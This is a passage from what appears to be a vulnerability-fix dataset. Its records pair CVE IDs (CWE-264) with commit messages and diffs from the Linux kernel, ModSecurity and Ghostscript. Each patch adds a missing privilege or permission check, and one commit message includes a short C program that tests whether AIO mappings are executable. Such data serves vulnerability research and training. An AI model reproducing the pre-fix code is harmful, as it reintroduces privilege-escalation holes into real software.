!capable(CAP_KILL))\n+\t     tsk->self_exec_id != tsk->parent_exec_id))\n \t\ttsk->exit_signal = SIGCHLD;\n \n \tsignal = tracehook_notify_death(tsk, &cookie, group_dead);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2007-4849","CWE_ID":"264","category":"security","commit_id":"9ed437c50d89eabae763dd422579f73fdebf288d","commit_message":"From 9ed437c50d89eabae763dd422579f73fdebf288d Mon Sep 17 00:00:00 2001\nFrom: David Woodhouse <dwmw2@infradead.org>\nDate: Wed, 22 Aug 2007 12:39:19 +0100\nSubject: [PATCH] [JFFS2] Fix ACL vs. mode handling.\n\nWhen POSIX ACL support was enabled, we weren't writing correct\nlegacy modes to the medium on inode creation, or when the ACL was set.\nThis meant that the permissions would be incorrect after the file system\nwas remounted.\n\nSigned-off-by: David Woodhouse <dwmw2@infradead.org>\n---\n fs\/jffs2\/acl.c      | 23 +++++++++++------------\n fs\/jffs2\/acl.h      |  4 +++-\n fs\/jffs2\/dir.c      | 33 +++++++++++++++++++++++----------\n fs\/jffs2\/fs.c       | 32 ++++++++++++++++++++++++++------\n fs\/jffs2\/os-linux.h |  5 ++++-\n 5 files changed, 67 insertions(+), 30 deletions(-)\n\n","diff_code":"diff --git a\/fs\/jffs2\/acl.c b\/fs\/jffs2\/acl.c\nindex 65b3a1b5b88d..8ec9323e830a 100644\n--- a\/fs\/jffs2\/acl.c\n+++ b\/fs\/jffs2\/acl.c\n@@ -176,7 +176,7 @@ static void jffs2_iset_acl(struct inode *inode, struct posix_acl **i_acl, struct\n \tspin_unlock(&inode->i_lock);\n }\n \n-static struct posix_acl *jffs2_get_acl(struct inode *inode, int type)\n+struct posix_acl *jffs2_get_acl(struct inode *inode, int type)\n {\n \tstruct jffs2_inode_info *f = JFFS2_INODE_INFO(inode);\n \tstruct posix_acl *acl;\n@@ -247,8 +247,13 @@ static int jffs2_set_acl(struct inode *inode, int type, struct posix_acl *acl)\n \t\t\tif (rc < 0)\n \t\t\t\treturn rc;\n \t\t\tif (inode->i_mode != mode) {\n-\t\t\t\tinode->i_mode = mode;\n-\t\t\t\tjffs2_dirty_inode(inode);\n+\t\t\t\tstruct iattr attr;\n+\n+\t\t\t\tattr.ia_valid = ATTR_MODE;\n+\t\t\t\tattr.ia_mode = mode;\n+\t\t\t\trc = jffs2_do_setattr(inode, &attr);\n+\t\t\t\tif (rc < 0)\n+\t\t\t\t\treturn rc;\n \t\t\t}\n \t\t\tif (rc == 0)\n \t\t\t\tacl = NULL;\n@@ -307,22 +312,16 @@ int jffs2_permission(struct inode *inode, int mask, struct nameidata *nd)\n \treturn generic_permission(inode, mask, jffs2_check_acl);\n }\n \n-int jffs2_init_acl(struct inode *inode, struct inode *dir)\n+int jffs2_init_acl(struct inode *inode, struct posix_acl *acl)\n {\n \tstruct jffs2_inode_info *f = JFFS2_INODE_INFO(inode);\n-\tstruct posix_acl *acl = NULL, *clone;\n+\tstruct posix_acl *clone;\n \tmode_t mode;\n \tint rc = 0;\n \n \tf->i_acl_access = JFFS2_ACL_NOT_CACHED;\n \tf->i_acl_default = JFFS2_ACL_NOT_CACHED;\n-\tif (!S_ISLNK(inode->i_mode)) {\n-\t\tacl = jffs2_get_acl(dir, ACL_TYPE_DEFAULT);\n-\t\tif (IS_ERR(acl))\n-\t\t\treturn PTR_ERR(acl);\n-\t\tif (!acl)\n-\t\t\tinode->i_mode &= ~current->fs->umask;\n-\t}\n+\n \tif (acl) {\n \t\tif (S_ISDIR(inode->i_mode)) {\n \t\t\trc = jffs2_set_acl(inode, ACL_TYPE_DEFAULT, acl);\ndiff --git a\/fs\/jffs2\/acl.h b\/fs\/jffs2\/acl.h\nindex c84378cee82a..90a2dbf59051 100644\n--- a\/fs\/jffs2\/acl.h\n+++ b\/fs\/jffs2\/acl.h\n@@ -28,9 +28,10 @@ struct jffs2_acl_header {\n \n #define JFFS2_ACL_NOT_CACHED ((void *)-1)\n \n+extern struct posix_acl *jffs2_get_acl(struct inode *inode, int type);\n extern int jffs2_permission(struct inode *, int, struct nameidata *);\n extern int jffs2_acl_chmod(struct inode *);\n-extern int jffs2_init_acl(struct inode *, struct inode *);\n+extern int jffs2_init_acl(struct inode *, struct posix_acl *);\n extern void jffs2_clear_acl(struct jffs2_inode_info *);\n \n extern struct xattr_handler jffs2_acl_access_xattr_handler;\n@@ -38,6 +39,7 @@ extern struct xattr_handler jffs2_acl_default_xattr_handler;\n \n #else\n \n+#define jffs2_get_acl(inode, type)\t(NULL)\n #define jffs2_permission NULL\n #define jffs2_acl_chmod(inode)\t\t(0)\n #define jffs2_init_acl(inode,dir)\t(0)\ndiff --git a\/fs\/jffs2\/dir.c b\/fs\/jffs2\/dir.c\nindex d293a1fad6d6..8353eb9c1799 100644\n--- a\/fs\/jffs2\/dir.c\n+++ b\/fs\/jffs2\/dir.c\n@@ -182,6 +182,7 @@ static int jffs2_create(struct inode *dir_i, struct dentry *dentry, int mode,\n \tstruct jffs2_inode_info *f, *dir_f;\n \tstruct jffs2_sb_info *c;\n \tstruct inode *inode;\n+\tstruct posix_acl *acl;\n \tint ret;\n \n \tri = jffs2_alloc_raw_inode();\n@@ -192,7 +193,7 @@ static int jffs2_create(struct inode *dir_i, struct dentry *dentry, int mode,\n \n \tD1(printk(KERN_DEBUG \"jffs2_create()\\n\"));\n \n-\tinode = jffs2_new_inode(dir_i, mode, ri);\n+\tinode = jffs2_new_inode(dir_i, mode, ri, &acl);\n \n \tif (IS_ERR(inode)) {\n \t\tD1(printk(KERN_DEBUG \"jffs2_new_inode() failed\\n\"));\n@@ -212,12 +213,12 @@ static int jffs2_create(struct inode *dir_i, struct dentry *dentry, int mode,\n \t\t\t      dentry->d_name.name, dentry->d_name.len);\n \n \tif (ret)\n-\t\tgoto fail;\n+\t\tgoto fail_acl;\n \n \tret = jffs2_init_security(inode, dir_i);\n \tif (ret)\n-\t\tgoto fail;\n-\tret = jffs2_init_acl(inode, dir_i);\n+\t\tgoto fail_acl;\n+\tret = jffs2_init_acl(inode, acl);\n \tif (ret)\n \t\tgoto fail;\n \n@@ -230,6 +231,8 @@ static int jffs2_create(struct inode *dir_i, struct dentry *dentry, int mode,\n \t\t  inode->i_ino, inode->i_mode, inode->i_nlink, f->inocache->nlink, inode->i_mapping->nrpages));\n \treturn 0;\n \n+ fail_acl:\n+\tposix_acl_release(acl);\n  fail:\n \tmake_bad_inode(inode);\n \tiput(inode);\n@@ -306,6 +309,7 @@ static int jffs2_symlink (struct inode *dir_i, struct dentry *dentry, const char\n \tstruct jffs2_full_dirent *fd;\n \tint namelen;\n \tuint32_t alloclen;\n+\tstruct posix_acl *acl;\n \tint ret, targetlen = strlen(target);\n \n \t\/* FIXME: If you care. We'd need to use frags for the target\n@@ -332,7 +336,7 @@ static int jffs2_symlink (struct inode *dir_i, struct dentry *dentry, const char\n \t\treturn ret;\n \t}\n \n-\tinode = jffs2_new_inode(dir_i, S_IFLNK | S_IRWXUGO, ri);\n+\tinode = jffs2_new_inode(dir_i, S_IFLNK | S_IRWXUGO, ri, &acl);\n \n \tif (IS_ERR(inode)) {\n \t\tjffs2_free_raw_inode(ri);\n@@ -362,6 +366,7 @@ static int jffs2_symlink (struct inode *dir_i, struct dentry *dentry, const char\n \t\tup(&f->sem);\n \t\tjffs2_complete_reservation(c);\n \t\tjffs2_clear_inode(inode);\n+\t\tposix_acl_release(acl);\n \t\treturn PTR_ERR(fn);\n \t}\n \n@@ -372,6 +377,7 @@ static int jffs2_symlink (struct inode *dir_i, struct dentry *dentry, const char\n \t\tup(&f->sem);\n \t\tjffs2_complete_reservation(c);\n \t\tjffs2_clear_inode(inode);\n+\t\tposix_acl_release(acl);\n \t\treturn -ENOMEM;\n \t}\n \n@@ -389,9 +395,10 @@ static int jffs2_symlink (struct inode *dir_i, struct dentry *dentry, const char\n \tret = jffs2_init_security(inode, dir_i);\n \tif (ret) {\n \t\tjffs2_clear_inode(inode);\n+\t\tposix_acl_release(acl);\n \t\treturn ret;\n \t}\n-\tret = jffs2_init_acl(inode, dir_i);\n+\tret = jffs2_init_acl(inode, acl);\n \tif (ret) {\n \t\tjffs2_clear_inode(inode);\n \t\treturn ret;\n@@ -469,6 +476,7 @@ static int jffs2_mkdir (struct inode *dir_i, struct dentry *dentry, int mode)\n \tstruct jffs2_full_dirent *fd;\n \tint namelen;\n \tuint32_t alloclen;\n+\tstruct posix_acl *acl;\n \tint ret;\n \n \tmode |= S_IFDIR;\n@@ -491,7 +499,7 @@ static int jffs2_mkdir (struct inode *dir_i, struct dentry *dentry, int mode)\n \t\treturn ret;\n \t}\n \n-\tinode = jffs2_new_inode(dir_i, mode, ri);\n+\tinode = jffs2_new_inode(dir_i, mode, ri, &acl);\n \n \tif (IS_ERR(inode)) {\n \t\tjffs2_free_raw_inode(ri);\n@@ -518,6 +526,7 @@ static int jffs2_mkdir (struct inode *dir_i, struct dentry *dentry, int mode)\n \t\tup(&f->sem);\n \t\tjffs2_complete_reservation(c);\n \t\tjffs2_clear_inode(inode);\n+\t\tposix_acl_release(acl);\n \t\treturn PTR_ERR(fn);\n \t}\n \t\/* No data here. Only a metadata node, which will be\n@@ -531,9 +540,10 @@ static int jffs2_mkdir (struct inode *dir_i, struct dentry *dentry, int mode)\n \tret = jffs2_init_security(inode, dir_i);\n \tif (ret) {\n \t\tjffs2_clear_inode(inode);\n+\t\tposix_acl_release(acl);\n \t\treturn ret;\n \t}\n-\tret = jffs2_init_acl(inode, dir_i);\n+\tret = jffs2_init_acl(inode, acl);\n \tif (ret) {\n \t\tjffs2_clear_inode(inode);\n \t\treturn ret;\n@@ -629,6 +639,7 @@ static int jffs2_mknod (struct inode *dir_i, struct dentry *dentry, int mode, de\n \tunion jffs2_device_node dev;\n \tint devlen = 0;\n \tuint32_t alloclen;\n+\tstruct posix_acl *acl;\n \tint ret;\n \n \tif (!new_valid_dev(rdev))\n@@ -655,7 +666,7 @@ static int jffs2_mknod (struct inode *dir_i, struct dentry *dentry, int mode, de\n \t\treturn ret;\n \t}\n \n-\tinode = jffs2_new_inode(dir_i, mode, ri);\n+\tinode = jffs2_new_inode(dir_i, mode, ri, &acl);\n \n \tif (IS_ERR(inode)) {\n \t\tjffs2_free_raw_inode(ri);\n@@ -684,6 +695,7 @@ static int jffs2_mknod (struct inode *dir_i, struct dentry *dentry, int mode, de\n \t\tup(&f->sem);\n \t\tjffs2_complete_reservation(c);\n \t\tjffs2_clear_inode(inode);\n+\t\tposix_acl_release(acl);\n \t\treturn PTR_ERR(fn);\n \t}\n \t\/* No data here. Only a metadata node, which will be\n@@ -697,9 +709,10 @@ static int jffs2_mknod (struct inode *dir_i, struct dentry *dentry, int mode, de\n \tret = jffs2_init_security(inode, dir_i);\n \tif (ret) {\n \t\tjffs2_clear_inode(inode);\n+\t\tposix_acl_release(acl);\n \t\treturn ret;\n \t}\n-\tret = jffs2_init_acl(inode, dir_i);\n+\tret = jffs2_init_acl(inode, acl);\n \tif (ret) {\n \t\tjffs2_clear_inode(inode);\n \t\treturn ret;\ndiff --git a\/fs\/jffs2\/fs.c b\/fs\/jffs2\/fs.c\nindex 1d3b7a9fc828..dd64ddc11d43 100644\n--- a\/fs\/jffs2\/fs.c\n+++ b\/fs\/jffs2\/fs.c\n@@ -24,7 +24,7 @@\n \n static int jffs2_flash_setup(struct jffs2_sb_info *c);\n \n-static int jffs2_do_setattr (struct inode *inode, struct iattr *iattr)\n+int jffs2_do_setattr (struct inode *inode, struct iattr *iattr)\n {\n \tstruct jffs2_full_dnode *old_metadata, *new_metadata;\n \tstruct jffs2_inode_info *f = JFFS2_INODE_INFO(inode);\n@@ -36,10 +36,8 @@ static int jffs2_do_setattr (struct inode *inode, struct iattr *iattr)\n \tunsigned int ivalid;\n \tuint32_t alloclen;\n \tint ret;\n+\n \tD1(printk(KERN_DEBUG \"jffs2_setattr(): ino #%lu\\n\", inode->i_ino));\n-\tret = inode_change_ok(inode, iattr);\n-\tif (ret)\n-\t\treturn ret;\n \n \t\/* Special cases - we don't want more than one data node\n \t   for these types on the medium at any time. So setattr\n@@ -183,9 +181,14 @@ int jffs2_setattr(struct dentry *dentry, struct iattr *iattr)\n {\n \tint rc;\n \n+\trc = inode_change_ok(dentry->d_inode, iattr);\n+\tif (rc)\n+\t\treturn rc;\n+\n \trc = jffs2_do_setattr(dentry->d_inode, iattr);\n \tif (!rc && (iattr->ia_valid & ATTR_MODE))\n \t\trc = jffs2_acl_chmod(dentry->d_inode);\n+\n \treturn rc;\n }\n \n@@ -399,7 +402,8 @@ void jffs2_write_super (struct super_block *sb)\n \n \/* jffs2_new_inode: allocate a new inode and inocache, add it to the hash,\n    fill in the raw_inode while you're at it. *\/\n-struct inode *jffs2_new_inode (struct inode *dir_i, int mode, struct jffs2_raw_inode *ri)\n+struct inode *jffs2_new_inode (struct inode *dir_i, int mode, struct jffs2_raw_inode *ri,\n+\t\t\t       struct posix_acl **acl)\n {\n \tstruct inode *inode;\n \tstruct super_block *sb = dir_i->i_sb;\n@@ -431,7 +435,23 @@ struct inode *jffs2_new_inode (struct inode *dir_i, int mode, struct jffs2_raw_i\n \t} else {\n \t\tri->gid = cpu_to_je16(current->fsgid);\n \t}\n-\tri->mode =  cpu_to_jemode(mode);\n+\n+\t\/* POSIX ACLs have to be processed now, at least partly.\n+\t   The umask is only applied if there's no default ACL *\/\n+\tif (!S_ISLNK(mode)) {\n+\t\t*acl = jffs2_get_acl(dir_i, ACL_TYPE_DEFAULT);\n+\t\tif (IS_ERR(*acl)) {\n+\t\t\tmake_bad_inode(inode);\n+\t\t\tiput(inode);\n+\t\t\tinode = (void *)*acl;\n+\t\t\t*acl = NULL;\n+\t\t\treturn inode;\n+\t\t}\n+\t\tif (!(*acl))\n+\t\t\tmode &= ~current->fs->umask;\n+\t} else {\n+\t\t*acl = NULL;\n+\t}\n \tret = jffs2_do_new_inode (c, f, mode, ri);\n \tif (ret) {\n \t\tmake_bad_inode(inode);\ndiff --git a\/fs\/jffs2\/os-linux.h b\/fs\/jffs2\/os-linux.h\nindex 80daea96bbc2..f6743a915cf3 100644\n--- a\/fs\/jffs2\/os-linux.h\n+++ b\/fs\/jffs2\/os-linux.h\n@@ -173,12 +173,15 @@ int jffs2_ioctl(struct inode *, struct file *, unsigned int, unsigned long);\n extern const struct inode_operations jffs2_symlink_inode_operations;\n \n \/* fs.c *\/\n+struct posix_acl;\n+\n int jffs2_setattr (struct dentry *, struct iattr *);\n+int jffs2_do_setattr (struct inode *, struct iattr *);\n void jffs2_read_inode (struct inode *);\n void jffs2_clear_inode (struct inode *);\n void jffs2_dirty_inode(struct inode *inode);\n struct inode *jffs2_new_inode (struct inode *dir_i, int mode,\n-\t\t\t       struct jffs2_raw_inode *ri);\n+\t\t\t       struct jffs2_raw_inode *ri, struct posix_acl **acl);\n int jffs2_statfs (struct dentry *, struct kstatfs *);\n void jffs2_write_super (struct super_block *);\n int jffs2_remount_fs (struct super_block *, int *, char *);\n-- \n2.21.0\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2013-5705","CWE_ID":"264","category":"security","commit_id":"f8d441cd25172fdfe5b613442fedfc0da3cc333d","commit_message":"From f8d441cd25172fdfe5b613442fedfc0da3cc333d Mon Sep 17 00:00:00 2001\nFrom: Breno Silva <breno.silva@gmail.com>\nDate: Wed, 4 Sep 2013 08:57:07 -0300\nSubject: [PATCH] Fix Chunked string case sensitive issue - CVE-2013-5705\n\n---\n apache2\/modsecurity.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/apache2\/modsecurity.c b\/apache2\/modsecurity.c\nindex 6b77132dd..b36775d22 100644\n--- a\/apache2\/modsecurity.c\n+++ b\/apache2\/modsecurity.c\n@@ -297,7 +297,7 @@ apr_status_t modsecurity_tx_init(modsec_rec *msr) {\n     if (msr->request_content_length == -1) {\n         \/* There's no C-L, but is chunked encoding used? *\/\n         char *transfer_encoding = (char *)apr_table_get(msr->request_headers, \"Transfer-Encoding\");\n-        if ((transfer_encoding != NULL)&&(strstr(transfer_encoding, \"chunked\") != NULL)) {\n+        if ((transfer_encoding != NULL)&&(m_strcasestr(transfer_encoding, \"chunked\") != NULL)) {\n             msr->reqbody_should_exist = 1;\n             msr->reqbody_chunked = 1;\n         }\n","owner":"SpiderLabs","repo":"ModSecurity","source":"cve"},{"CVE_ID":"CVE-2008-2931","CWE_ID":"264","category":"security","commit_id":"ee6f958291e2a768fd727e7a67badfff0b67711a","commit_message":"From ee6f958291e2a768fd727e7a67badfff0b67711a Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <mszeredi@suse.cz>\nDate: Tue, 8 May 2007 00:30:40 -0700\nSubject: check privileges before setting mount propagation\n\nThere's a missing check for CAP_SYS_ADMIN in do_change_type().\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/namespace.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/fs\/namespace.c b\/fs\/namespace.c\nindex 72bb1062bfe7..b696e3a0d18f 100644\n--- a\/fs\/namespace.c\n+++ b\/fs\/namespace.c\n@@ -886,6 +886,9 @@ static int do_change_type(struct nameidata *nd, int flag)\n \tint recurse = flag & MS_REC;\n \tint type = flag & ~MS_REC;\n \n+\tif (!capable(CAP_SYS_ADMIN))\n+\t\treturn -EPERM;\n+\n \tif (nd->dentry != nd->mnt->mnt_root)\n \t\treturn -EINVAL;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-12904","CWE_ID":"264","category":"security","commit_id":"727ba748e110b4de50d142edca9d6a9b7e6111d8","commit_message":"From 727ba748e110b4de50d142edca9d6a9b7e6111d8 Mon Sep 17 00:00:00 2001\nFrom: Felix Wilhelm <fwilhelm@google.com>\nDate: Mon, 11 Jun 2018 09:43:44 +0200\nSubject: kvm: nVMX: Enforce cpl=0 for VMX instructions\n\nVMX instructions executed inside a L1 VM will always trigger a VM exit\neven when executed with cpl 3. This means we must perform the\nprivilege check in software.\n\nFixes: 70f3aac964ae(\"kvm: nVMX: Remove superfluous VMX instruction fault checks\")\nCc: stable@vger.kernel.org\nSigned-off-by: Felix Wilhelm <fwilhelm@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n arch\/x86\/kvm\/vmx.c | 15 +++++++++++++--\n 1 file changed, 13 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/vmx.c b\/arch\/x86\/kvm\/vmx.c\nindex 709de996f063..4bf1f9de9332 100644\n--- a\/arch\/x86\/kvm\/vmx.c\n+++ b\/arch\/x86\/kvm\/vmx.c\n@@ -7905,6 +7905,12 @@ static int handle_vmon(struct kvm_vcpu *vcpu)\n \t\treturn 1;\n \t}\n \n+\t\/* CPL=0 must be checked manually. *\/\n+\tif (vmx_get_cpl(vcpu)) {\n+\t\tkvm_queue_exception(vcpu, UD_VECTOR);\n+\t\treturn 1;\n+\t}\n+\n \tif (vmx->nested.vmxon) {\n \t\tnested_vmx_failValid(vcpu, VMXERR_VMXON_IN_VMX_ROOT_OPERATION);\n \t\treturn kvm_skip_emulated_instruction(vcpu);\n@@ -7964,6 +7970,11 @@ static int handle_vmon(struct kvm_vcpu *vcpu)\n  *\/\n static int nested_vmx_check_permission(struct kvm_vcpu *vcpu)\n {\n+\tif (vmx_get_cpl(vcpu)) {\n+\t\tkvm_queue_exception(vcpu, UD_VECTOR);\n+\t\treturn 0;\n+\t}\n+\n \tif (!to_vmx(vcpu)->nested.vmxon) {\n \t\tkvm_queue_exception(vcpu, UD_VECTOR);\n \t\treturn 0;\n@@ -8283,7 +8294,7 @@ static int handle_vmread(struct kvm_vcpu *vcpu)\n \t\tif (get_vmx_mem_address(vcpu, exit_qualification,\n \t\t\t\tvmx_instruction_info, true, &gva))\n \t\t\treturn 1;\n-\t\t\/* _system ok, as hardware has verified cpl=0 *\/\n+\t\t\/* _system ok, nested_vmx_check_permission has verified cpl=0 *\/\n \t\tkvm_write_guest_virt_system(&vcpu->arch.emulate_ctxt, gva,\n \t\t\t     &field_value, (is_long_mode(vcpu) ? 8 : 4), NULL);\n \t}\n@@ -8448,7 +8459,7 @@ static int handle_vmptrst(struct kvm_vcpu *vcpu)\n \tif (get_vmx_mem_address(vcpu, exit_qualification,\n \t\t\tvmx_instruction_info, true, &vmcs_gva))\n \t\treturn 1;\n-\t\/* ok to use *_system, as hardware has verified cpl=0 *\/\n+\t\/* *_system ok, nested_vmx_check_permission has verified cpl=0 *\/\n \tif (kvm_write_guest_virt_system(&vcpu->arch.emulate_ctxt, vmcs_gva,\n \t\t\t\t (void *)&to_vmx(vcpu)->nested.current_vmptr,\n \t\t\t\t sizeof(u64), &e)) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2018-16863","CWE_ID":"264","category":"security","commit_id":"79cccf641486a6595c43f1de1cd7ade696020a31","commit_message":"From 79cccf641486a6595c43f1de1cd7ade696020a31 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Sat, 25 Aug 2018 07:45:45 +0100\nSubject: [PATCH] Bug 699654(2): preserve LockSafetyParams in the nulldevice\n\nThe nulldevice does not necessarily use the normal setpagedevice machinery,\nbut can be set using the nulldevice operator. In which case, we don't preserve\nthe settings from the original device (in the way setpagedevice does).\n\nSince nulldevice does nothing, this is not generally a problem, but in the case\nof LockSafetyParams it *is* important when we restore back to the original\ndevice, when LockSafetyParams not being set is \"preserved\" into the post-\nrestore configuration.\n\nWe have to initialise the value to false because the nulldevice is used during\ninitialisation (before any other device exists), and *must* be writable for\nthat.\n---\n base\/gsdevice.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/base\/gsdevice.c b\/base\/gsdevice.c\nindex 0659220..e38086d 100644\n--- a\/base\/gsdevice.c\n+++ b\/base\/gsdevice.c\n@@ -691,7 +691,7 @@ int\n gs_nulldevice(gs_gstate * pgs)\n {\n     int code = 0;\n-\n+    bool saveLockSafety = false;\n     if (pgs->device == 0 || !gx_device_is_null(pgs->device)) {\n         gx_device *ndev;\n         code = gs_copydevice(&ndev, (const gx_device *)&gs_null_device,\n@@ -699,6 +699,8 @@ gs_nulldevice(gs_gstate * pgs)\n \n         if (code < 0)\n             return code;\n+        if (gs_currentdevice_inline(pgs) != NULL)\n+            saveLockSafety = gs_currentdevice_inline(pgs)->LockSafetyParams;\n         \/*\n          * Internal devices have a reference count of 0, not 1,\n          * aside from references from graphics states.\n@@ -718,6 +720,7 @@ gs_nulldevice(gs_gstate * pgs)\n \n         if ((code = gs_setdevice_no_erase(pgs, ndev)) < 0)\n             gs_free_object(pgs->memory, ndev, \"gs_copydevice(device)\");\n+        gs_currentdevice_inline(pgs)->LockSafetyParams = saveLockSafety;\n     }\n     return code;\n }\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-10044","CWE_ID":"264","category":"security","commit_id":"22f6b4d34fcf039c63a94e7670e0da24f8575a5a","commit_message":"From 22f6b4d34fcf039c63a94e7670e0da24f8575a5a Mon Sep 17 00:00:00 2001\nFrom: Jann Horn <jann@thejh.net>\nDate: Fri, 16 Sep 2016 00:31:22 +0200\nSubject: aio: mark AIO pseudo-fs noexec\n\nThis ensures that do_mmap() won't implicitly make AIO memory mappings\nexecutable if the READ_IMPLIES_EXEC personality flag is set.  Such\nbehavior is problematic because the security_mmap_file LSM hook doesn't\ncatch this case, potentially permitting an attacker to bypass a W^X\npolicy enforced by SELinux.\n\nI have tested the patch on my machine.\n\nTo test the behavior, compile and run this:\n\n    #define _GNU_SOURCE\n    #include <unistd.h>\n    #include <sys\/personality.h>\n    #include <linux\/aio_abi.h>\n    #include <err.h>\n    #include <stdlib.h>\n    #include <stdio.h>\n    #include <sys\/syscall.h>\n\n    int main(void) {\n        personality(READ_IMPLIES_EXEC);\n        aio_context_t ctx = 0;\n        if (syscall(__NR_io_setup, 1, &ctx))\n            err(1, \"io_setup\");\n\n        char cmd[1000];\n        sprintf(cmd, \"cat \/proc\/%d\/maps | grep -F '\/[aio]'\",\n            (int)getpid());\n        system(cmd);\n        return 0;\n    }\n\nIn the output, \"rw-s\" is good, \"rwxs\" is bad.\n\nSigned-off-by: Jann Horn <jann@thejh.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/aio.c | 7 ++++++-\n 1 file changed, 6 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/aio.c b\/fs\/aio.c\nindex fb8e45b88cd4..4fe81d1c60f9 100644\n--- a\/fs\/aio.c\n+++ b\/fs\/aio.c\n@@ -239,7 +239,12 @@ static struct dentry *aio_mount(struct file_system_type *fs_type,\n \tstatic const struct dentry_operations ops = {\n \t\t.d_dname\t= simple_dname,\n \t};\n-\treturn mount_pseudo(fs_type, \"aio:\", NULL, &ops, AIO_RING_MAGIC);\n+\tstruct dentry *root = mount_pseudo(fs_type, \"aio:\", NULL, &ops,\n+\t\t\t\t\t   AIO_RING_MAGIC);\n+\n+\tif (!IS_ERR(root))\n+\t\troot->d_sb->s_iflags |= SB_I_NOEXEC;\n+\treturn root;\n }\n \n \/* aio_setup\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9322","CWE_ID":"264","category":"security","commit_id":"6f442be2fb22be02cafa606f1769fa1e6f894441","commit_message":"From 6f442be2fb22be02cafa606f1769fa1e6f894441 Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Sat, 22 Nov 2014 18:00:32 -0800\nSubject: x86_64, traps: Stop using IST for #SS\n\nOn a 32-bit kernel, this has no effect, since there are no IST stacks.\n\nOn a 64-bit kernel, #SS can only happen in user code, on a failed iret\nto user space, a canonical violation on access via RSP or RBP, or a\ngenuine stack segment violation in 32-bit kernel code.  The first two\ncases don't need IST, and the latter two cases are unlikely fatal bugs,\nand promoting them to double faults would be fine.\n\nThis fixes a bug in which the espfix64 code mishandles a stack segment\nviolation.\n\nThis saves 4k of memory per CPU and a tiny bit of code.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nReviewed-by: Thomas Gleixner <tglx@linutronix.de>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/x86\/include\/asm\/page_32_types.h |  1 -\n arch\/x86\/include\/asm\/page_64_types.h | 11 +++++------\n arch\/x86\/include\/asm\/traps.h         |  1 +\n arch\/x86\/kernel\/dumpstack_64.c       |  1 -\n arch\/x86\/kernel\/entry_64.S           |  2 +-\n arch\/x86\/kernel\/traps.c              | 18 +-----------------\n 6 files changed, 8 insertions(+), 26 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/include\/asm\/page_32_types.h b\/arch\/x86\/include\/asm\/page_32_types.h\nindex f48b17df4224..3a52ee0e726d 100644\n--- a\/arch\/x86\/include\/asm\/page_32_types.h\n+++ b\/arch\/x86\/include\/asm\/page_32_types.h\n@@ -20,7 +20,6 @@\n #define THREAD_SIZE_ORDER\t1\n #define THREAD_SIZE\t\t(PAGE_SIZE << THREAD_SIZE_ORDER)\n \n-#define STACKFAULT_STACK 0\n #define DOUBLEFAULT_STACK 1\n #define NMI_STACK 0\n #define DEBUG_STACK 0\ndiff --git a\/arch\/x86\/include\/asm\/page_64_types.h b\/arch\/x86\/include\/asm\/page_64_types.h\nindex 678205195ae1..75450b2c7be4 100644\n--- a\/arch\/x86\/include\/asm\/page_64_types.h\n+++ b\/arch\/x86\/include\/asm\/page_64_types.h\n@@ -14,12 +14,11 @@\n #define IRQ_STACK_ORDER 2\n #define IRQ_STACK_SIZE (PAGE_SIZE << IRQ_STACK_ORDER)\n \n-#define STACKFAULT_STACK 1\n-#define DOUBLEFAULT_STACK 2\n-#define NMI_STACK 3\n-#define DEBUG_STACK 4\n-#define MCE_STACK 5\n-#define N_EXCEPTION_STACKS 5  \/* hw limit: 7 *\/\n+#define DOUBLEFAULT_STACK 1\n+#define NMI_STACK 2\n+#define DEBUG_STACK 3\n+#define MCE_STACK 4\n+#define N_EXCEPTION_STACKS 4  \/* hw limit: 7 *\/\n \n #define PUD_PAGE_SIZE\t\t(_AC(1, UL) << PUD_SHIFT)\n #define PUD_PAGE_MASK\t\t(~(PUD_PAGE_SIZE-1))\ndiff --git a\/arch\/x86\/include\/asm\/traps.h b\/arch\/x86\/include\/asm\/traps.h\nindex bc8352e7010a..707adc6549d8 100644\n--- a\/arch\/x86\/include\/asm\/traps.h\n+++ b\/arch\/x86\/include\/asm\/traps.h\n@@ -39,6 +39,7 @@ asmlinkage void simd_coprocessor_error(void);\n \n #ifdef CONFIG_TRACING\n asmlinkage void trace_page_fault(void);\n+#define trace_stack_segment stack_segment\n #define trace_divide_error divide_error\n #define trace_bounds bounds\n #define trace_invalid_op invalid_op\ndiff --git a\/arch\/x86\/kernel\/dumpstack_64.c b\/arch\/x86\/kernel\/dumpstack_64.c\nindex 1abcb50b48ae..ff86f19b5758 100644\n--- a\/arch\/x86\/kernel\/dumpstack_64.c\n+++ b\/arch\/x86\/kernel\/dumpstack_64.c\n@@ -24,7 